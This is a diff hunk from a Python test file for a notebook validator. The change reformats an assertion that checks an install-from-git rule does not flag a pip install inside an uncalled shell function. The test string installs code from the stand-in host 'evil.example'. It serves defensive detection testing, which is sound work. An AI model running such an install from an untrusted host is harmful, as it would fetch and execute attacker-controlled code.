@@ -4999,7 +4999,12 @@ def test_an_uncalled_function_body_is_unreachable_not_conditional():
     """
     nv = _load_notebook_validator_module()
 
-    assert nv.rule_inst_001_git_plus("!f(){ pip install git+https://evil.example/x.git; }", "nb.ipynb", 0) == []
+    assert (
+        nv.rule_inst_001_git_plus(
+            "!f(){ pip install git+https://evil.example/x.git; }", "nb.ipynb", 0
+        )
+        == []
+    )
     assert nv._split_chained("!f(){ pip install a; }; pip install b") == [("!pip install b", False)]
     # Called, it is reported like any other install.
     assert [
